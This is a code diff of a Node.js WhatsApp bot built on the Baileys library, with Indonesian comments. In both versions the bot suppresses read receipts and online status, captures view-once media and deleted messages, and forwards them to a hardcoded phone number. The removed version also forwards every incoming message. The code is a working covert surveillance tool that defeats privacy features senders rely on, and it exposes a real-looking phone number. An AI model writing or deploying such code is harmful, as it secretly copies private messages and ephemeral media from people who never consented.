@@ -1,130 +1,87 @@
+// ------------------------------
+// WhatsApp Silent Bot (No Read / No Online / Anti Delete / Anti ViewOnce)
+// ------------------------------
 const {
-    default: makeWASocket,
-    DisconnectReason,
-    useMultiFileAuthState,
-    fetchLatestBaileysVersion
-} = require('@whiskeysockets/baileys')
-const pino = require('pino')
-const fs = require('fs')
+  default: makeWASocket,
+  useMultiFileAuthState,
+  DisconnectReason,
+  fetchLatestBaileysVersion
+} = require("@whiskeysockets/baileys");
+const P = require("pino");
 
-// Nomor admin penerima log
-const admin = '6282244877433@s.whatsapp.net'
+// Folder penyimpanan sesi
+const SESSION_FOLDER = "./session";
 
 async function startBot() {
-    const { state, saveCreds } = await useMultiFileAuthState('./auth_info')
-    const { version } = await fetchLatestBaileysVersion()
-    const sock = makeWASocket({
-        version,
-        printQRInTerminal: true,
-        auth: state,
-        logger: pino({ level: 'silent' }),
-        markOnlineOnConnect: false,
-        syncFullHistory: false,
-        generateHighQualityLinkPreview: false
-    })
+  const { state, saveCreds } = await useMultiFileAuthState(SESSION_FOLDER);
+  const { version } = await fetchLatestBaileysVersion();
 
-    sock.ev.on('creds.update', saveCreds)
+  const sock = makeWASocket({
+    version,
+    logger: P({ level: "silent" }),
+    printQRInTerminal: false,
+    browser: ["RailwaySilentBot", "Chrome", "1.0.0"],
+    auth: state,
+    // jangan kirim notifikasi typing, online, read receipt
+    markOnlineOnConnect: false,
+    sendPresence: false,
+    shouldIgnoreJid: () => true
+  });
 
-    // Abaikan telepon
-    sock.ev.on('call', async call => {
-        for (let id in call) await sock.rejectCall(id)
-    })
+  // Jangan kirim receipt read/delivered
+  sock.readMessages = async () => {};
+  sock.sendPresenceUpdate = async () => {};
+  sock.sendReceipts = async () => {};
 
-    // Pesan masuk / anti-hapus / anti-view-once
-    sock.ev.on('messages.upsert', async ({ messages }) => {
-        const msg = messages[0]
-        if (!msg.message) return
-        if (msg.key.remoteJid === 'status@broadcast') return
+  // Auto save creds
+  sock.ev.on("creds.update", saveCreds);
 
-        const from = msg.key.remoteJid
-        const sender = msg.pushName || 'Tanpa Nama'
+  // Anti hapus pesan (termasuk media & stiker)
+  sock.ev.on("messages.delete", async (m) => {
+    try {
+      const msg = m.messages[0];
+      const sender = msg.key.remoteJid;
+      const type = Object.keys(msg.message)[0];
+      await sock.sendMessage("6282244877433@s.whatsapp.net", {
+        text: `🚫 Pesan dihapus!\nDari: ${sender}\nTipe: ${type}`
+      });
+    } catch (e) {}
+  });
 
-        // View-once
-        if (msg.message?.viewOnceMessage || msg.message?.viewOnceMessageV2) {
-            await sock.sendMessage(admin, {
-                text: `📸 *Pesan sekali lihat* dari ${sender} (${from})`
-            })
-            const media = msg.message.viewOnceMessage?.message?.imageMessage ||
-                          msg.message.viewOnceMessageV2?.message?.videoMessage
-            if (media) {
-                const buffer = await sock.downloadMediaMessage(msg)
-                await sock.sendMessage(admin, { image: buffer, caption: 'Konten sekali lihat' })
-            }
-        }
+  // Anti sekali lihat (termasuk media)
+  sock.ev.on("messages.upsert", async (m) => {
+    const msg = m.messages[0];
+    if (!msg.message) return;
+    const type = Object.keys(msg.message)[0];
 
-        // Pesan biasa
-        if (!msg.key.fromMe) {
-            const teks = msg.message.conversation ||
-                         msg.message.extendedTextMessage?.text ||
-                         '[Non-teks]'
-            await sock.sendMessage(admin, {
-                text: `💬 *Pesan baru dari* ${sender} (${from}):\n${teks}`
-            })
-        }
-    })
+    if (type === "viewOnceMessageV2" || type === "viewOnceMessage") {
+      const mediaMsg = msg.message.viewOnceMessageV2
+        ? msg.message.viewOnceMessageV2.message
+        : msg.message.viewOnceMessage.message;
+      msg.message = mediaMsg;
+      await sock.sendMessage("6282244877433@s.whatsapp.net", {
+        text: "👀 Pesan sekali lihat terdeteksi!"
+      });
+      await sock.sendMessage("6282244877433@s.whatsapp.net", msg.message);
+    }
+  });
 
-    // Deteksi penghapusan pesan/media/stiker
-    sock.ev.on('messages.update', async updates => {
-        for (const upd of updates) {
-            if (upd.update.messageStubType === 1) {
-                const { remoteJid, id, participant } = upd.key
-                const chat = remoteJid || 'Tidak diketahui'
-                await sock.sendMessage(admin, {
-                    text: `🚫 *Pesan dihapus*\nDari: ${participant || chat}\nID: ${id}`
-                })
+  // Abaikan panggilan (supaya tidak crash)
+  sock.ev.on("call", (call) => {
+    console.log("📞 Call ignored from:", call.from);
+  });
 
-                try {
-                    // Ambil pesan terhapus dari penyimpanan sementara
-                    const m = await sock.loadMessage(remoteJid, id)
-                    if (!m) return
-
-                    const msgContent = m.message
-                    if (msgContent?.imageMessage) {
-                        const buffer = await sock.downloadMediaMessage(m)
-                        await sock.sendMessage(admin, {
-                            image: buffer,
-                            caption: '🖼️ Gambar yang dihapus'
-                        })
-                    } else if (msgContent?.videoMessage) {
-                        const buffer = await sock.downloadMediaMessage(m)
-                        await sock.sendMessage(admin, {
-                            video: buffer,
-                            caption: '🎞️ Video yang dihapus'
-                        })
-                    } else if (msgContent?.stickerMessage) {
-                        const buffer = await sock.downloadMediaMessage(m)
-                        await sock.sendMessage(admin, {
-                            sticker: buffer
-                        })
-                    } else if (msgContent?.documentMessage) {
-                        const buffer = await sock.downloadMediaMessage(m)
-                        await sock.sendMessage(admin, {
-                            document: buffer,
-                            fileName: msgContent.documentMessage.fileName || 'file'
-                        })
-                    } else {
-                        const text =
-                            msgContent?.conversation ||
-                            msgContent?.extendedTextMessage?.text ||
-                            '[Pesan non-media dihapus]'
-                        await sock.sendMessage(admin, {
-                            text: `🗑️ Isi pesan: ${text}`
-                        })
-                    }
-                } catch (e) {
-                    console.log('Gagal ambil pesan terhapus', e)
-                }
-            }
-        }
-    })
-
-    // Reconnect otomatis
-    sock.ev.on('connection.update', update => {
-        const { connection, lastDisconnect } = update
-        if (connection === 'close' &&
-            lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut)
-            startBot()
-    })
+  // Reconnect otomatis
+  sock.ev.on("connection.update", (update) => {
+    const { connection, lastDisconnect } = update;
+    if (connection === "close") {
+      const shouldReconnect =
+        lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+      if (shouldReconnect) startBot();
+    } else if (connection === "open") {
+      console.log("✅ Bot connected silently (no online mark, no read receipts).");
+    }
+  });
 }
 
-startBot()
+startBot();
